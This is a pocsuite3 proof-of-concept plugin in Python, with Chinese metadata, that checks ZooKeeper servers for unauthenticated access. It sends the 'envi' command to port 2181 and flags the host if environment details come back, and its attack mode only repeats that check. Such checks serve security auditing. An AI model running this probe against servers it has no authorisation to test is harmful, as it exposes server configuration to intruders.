#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @File : zookeeper_unauthorized_access.py
# @Author : Norah C.IV
# @Time : 2022/5/6 10:18
# @Software: PyCharm
import socket

from pocsuite3.lib.core.enums import VUL_TYPE, POC_CATEGORY
from pocsuite3.lib.core.poc import POCBase, Output
from pocsuite3.lib.core.register import register_poc


class DemoPOC(POCBase):
    vulID = '2'
    version = '1'
    author = ['Norah C.IV']
    vulDate = '2022-05-06'
    createDate = '2022-05-06'
    updateDate = '2022-05-06'
    references = ['']
    name = 'Zookeeper 未授权访问'
    appPowerLink = ''
    appName = 'Zookeeper'
    appVersion = 'All'
    vulType = VUL_TYPE.UNAUTHORIZED_ACCESS
    desc = '''
    Zookeeper安装部署后默认情况下不需要任何身份验证，造成攻击者可以远程利用Zookeeper，通过服务器收集敏感信息或者在Zookeeper
    集群内进行破坏
    '''
    samples = ['']
    category = POC_CATEGORY.EXPLOITS.REMOTE
    protocol = POC_CATEGORY.PROTOCOL.ZOOKEEPER

    def _verify(self):
        result = {}
        host = self.getg_option("rhost")
        port = self.getg_option("rport") or 2181

        if zookeeper_check(host, port, 3):
            result['VerifyInfo'] = {}
            result['VerifyInfo']['Info'] = "Zookeeper未授权访问"
            result['VerifyInfo']['Host'] = host
        return self.parse_attack(result)

    def _attack(self):
        return self._verify()

    def parse_attack(self, result):
        output = Output(self)

        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')

        return output


def zookeeper_check(host, port, timeout):
    try:
        socket.setdefaulttimeout(timeout)
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((host, int(port)))
        flag = b'envi'
        s.send(flag)
        data = s.recv(1024)
        s.close()
        if 'Environment' in str(data):
            return True
    except:
        return False


register_poc(DemoPOC)
